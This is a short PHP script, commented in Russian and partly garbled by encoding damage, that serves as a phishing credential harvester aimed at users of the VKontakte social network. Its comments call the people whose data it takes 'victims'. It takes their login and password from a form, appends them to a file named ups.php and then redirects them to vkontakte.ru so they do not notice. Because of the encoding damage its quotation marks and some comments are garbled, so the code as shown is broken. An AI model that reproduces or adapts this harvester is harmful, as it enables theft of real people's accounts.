<?

$Login = $_POST[zabor]; // Ћогин  жертвы

$Pass = $_POST[СzenaТ]; // ѕароль жертвы

$log = fopen(Ђups.phpї,їa+ї); //тут будут лежать пароли жертв

fwrite($log,ї<br> $Login:$Pass \nї); //производим запись в ups.php

fclose($log); //закрывает ups.php

echo Ђ<html><head><META HTTP-EQUIV=ТRefreshТ content =Т0; URL=http://vkontakte.ruТ></head></html>ї; // перенаправл€ем жертву на http://vk.com

?>